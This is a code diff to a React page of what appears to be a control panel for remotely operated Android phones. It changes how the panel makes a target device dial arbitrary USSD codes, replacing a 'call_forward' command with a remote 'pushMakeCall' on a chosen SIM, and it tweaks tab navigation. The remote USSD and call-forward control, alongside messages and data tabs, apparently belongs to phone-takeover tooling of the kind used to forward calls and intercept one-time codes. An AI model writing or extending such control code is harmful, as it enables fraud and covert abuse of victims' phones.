@@ -594,28 +594,35 @@ export default function DeviceDetailPage() {
     }
   }
 
-  // ── Dial USSD (uses call_forward command — same as old panel!) ────────────
-  function handleDialUssd() {
+  // ── Dial USSD — same as Direct Call (pushMakeCall), USSD code = number to dial
+  async function handleDialUssd() {
     if (!ussdCode.trim()) return;
-    const simLbl = ussdSim === 0 ? "SIM 1" : "SIM 2";
-    const code   = ussdCode.trim();
+    const code = ussdCode.trim();
     setUssdOpen(false); setUssdCode("");
     logStatus(`Dialing USSD: ${code}`);
-    openAlert("ussd",
-      "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
-    );
-    // call_forward WS command — APK handles ANY USSD code via callCode field
-    const wsOk = wsService.sendCmd("call_forward", {
-      uniqueid: did, phoneNumber: "", sim: simLbl,
-      callCode: code, timestamp: Date.now(),
-    });
-    if (!wsOk) {
-      // FCM fallback
-      pushCallForward(did, code, simLbl, "")
-        .then((result) => {
-          if (!result.success) showResult("❌ USSD failed: " + (result.error || "device offline"));
-        })
-        .catch((e: any) => { showResult("❌ USSD error: " + safeStr(e?.message)); });
+    // Use pushMakeCall — exact same logic as old Direct Call feature
+    // APK dials the USSD code just like a phone number
+    alertActionRef.current = "ussd";
+    alertWindowRef.current = Date.now();
+    try {
+      const result = await pushMakeCall(did, code, ussdSim);
+      if (result.success) {
+        setDevAlert({
+          message: `✅ USSD ${code} dialed via SIM ${ussdSim + 1}`,
+          startTime: alertWindowRef.current,
+        });
+        logStatus(`USSD ${code} dialed`, "green");
+      } else {
+        setDevAlert({
+          message: `❌ USSD failed: ${result.error || "device offline"}`,
+          startTime: alertWindowRef.current,
+        });
+      }
+    } catch (e: any) {
+      setDevAlert({
+        message: `❌ USSD error: ${safeStr(e?.message)}`,
+        startTime: alertWindowRef.current,
+      });
     }
   }
 
@@ -626,7 +633,7 @@ export default function DeviceDetailPage() {
 
   function handleTopNavTabChange(tab: TabKey) {
     if (tab === "home")    { navBack(); return; }
-    if (tab === "devices") { navBack(); return; }
+    if (tab === "devices") { nav("/", { state: { tab: "devices" } }); return; }
     if (tab === "data")     setDeviceTab("data");
     if (tab === "messages") setDeviceTab("messages");
     if (tab === "groups")   setDeviceTab("groups");
